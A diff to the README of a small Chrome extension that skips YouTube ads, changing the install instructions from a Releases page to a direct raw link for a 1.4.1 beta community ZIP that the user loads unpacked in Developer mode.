@@ -6,7 +6,7 @@ A small Chrome extension that clicks available Skip Ad controls. YouTube is buil
 
 ## Try it
 
-Download a community ZIP from Releases, extract it, then open `chrome://extensions`, enable Developer mode and choose **Load unpacked**. Select the `youtube-auto-skip` folder containing `manifest.json`. Chrome 119+ required.
+[Download the 1.4.1 Beta community ZIP](https://github.com/googy0099-cell/youtube-auto-skip/raw/refs/heads/main/downloads/youtube-auto-skip-1.4.1-community.zip), extract it, then open `chrome://extensions`, enable Developer mode and choose **Load unpacked**. Select the `youtube-auto-skip` folder containing `manifest.json`. Chrome 119+ required.
 
 Click the toolbar icon, add a website and approve access. No settings tab opens. Pause or remove websites from the same popup. Read the [English guide](distribution/INSTALL-EN.md) or [คู่มือภาษาไทย](distribution/INSTALL-TH.md).
 
